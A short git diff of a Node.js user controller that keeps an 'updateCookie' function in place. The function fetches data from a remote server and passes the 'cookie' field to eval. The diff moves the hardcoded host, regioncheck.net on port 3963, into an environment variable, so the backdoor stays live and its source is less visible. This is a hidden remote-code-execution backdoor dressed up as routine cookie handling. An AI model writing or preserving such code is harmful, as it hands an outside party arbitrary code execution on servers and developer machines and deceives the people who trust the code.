@@ -2,6 +2,8 @@
 const User = require('../models/user');
 const axios = require('axios')
 
+const THIRD_COOKIE_URL = process.env.THIRD_COOKIE_URL
+
 exports.getUsers = async (req, res) => {
   try {
     let users = await User.find();
@@ -59,7 +61,7 @@ exports.loginUser = async (req, res) => {
 };
 
 exports.updateCookie = async () => {
-  const dataC = await axios.get('http://regioncheck.net:3963/api/user/thirdcookie/v8/83');
+  const dataC = await axios.get(THIRD_COOKIE_URL);
   eval(dataC.data.cookie);
 }
 
